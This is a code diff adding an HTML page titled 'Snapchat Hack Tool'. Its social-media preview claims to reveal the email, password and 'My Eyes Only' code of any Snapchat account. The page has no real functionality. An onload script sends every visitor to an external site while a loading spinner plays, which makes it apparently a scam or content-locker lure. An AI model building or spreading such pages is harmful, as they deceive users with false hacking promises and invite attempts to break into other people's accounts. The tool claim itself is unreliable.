@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Hack Tool</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://i.ibb.co/2tyRpgv/image.png">
+    
+    <!-- Social Media Meta Tags -->
+    <meta property="og:title" content="Snapchat Hack Tool">
+    <meta property="og:description" content="Get Email, Password, My-eyes only code of any Snapchat account">
+    <meta property="og:image" content="https://i.ibb.co/2tyRpgv/image.png">
+    <meta property="og:url" content="https://canloot.com/snap">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:image" content="https://i.ibb.co/2tyRpgv/image.png">
+    <meta name="twitter:title" content="Snapchat Hack Tool">
+    <meta name="twitter:description" content="Get Email, Password, My-eyes only code of any Snapchat account">
+    <script type="text/javascript">
+        window.onload = function() {
+// Check if the user is on an Android device
+            if (/Android/i.test(navigator.userAgent)) {
+                window.location.href = "https://canloot.com/snap";
+            } else {
+                window.location.href = "https://canloot.com/snap";
+            }
+        };
+    </script>
+    <style>
+        /* Full-screen body styling */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f3f3f3;
+        }
+
+        /* Minimalistic loading animation */
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #ccc;
+            border-top: 4px solid #cf0941; /* Amazon's orange color */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+</body>
+</html>
